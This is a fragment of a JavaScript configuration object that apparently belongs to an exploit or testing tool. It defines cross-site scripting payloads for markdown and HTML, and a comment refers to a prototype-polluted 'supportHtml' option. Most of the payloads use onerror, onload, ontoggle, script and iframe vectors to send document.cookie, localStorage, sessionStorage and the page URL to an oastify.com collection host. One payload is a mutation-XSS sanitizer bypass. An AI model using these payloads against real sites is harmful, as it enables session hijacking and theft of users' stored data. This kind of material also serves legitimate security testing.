...
const CONFIG = {
  ...
  xssPayload: {
    ...
    markdown: [
      '<img src=x onerror="fetch(\'https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/\'+document.cookie)">',
      '<svg/onload="fetch(\'https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/c?\'+document.cookie)">',
      '<details open ontoggle="fetch(\'https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/d?\'+document.cookie)">',
      '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'
    ].join('\n'),

    // Plain HTML that passes through when supportHtml is polluted true
    html: [
      '<script>fetch("https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/exfil",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:{...localStorage},sessionStorage:{...sessionStorage},location:location.href})})</script>',
      '<iframe src="https://8bkgo1diqbdj2gfhe0agi8smddj57vvk.oastify.com/steal?' + 'c="+document.cookie></iframe>'
    ].join('\n')
  },
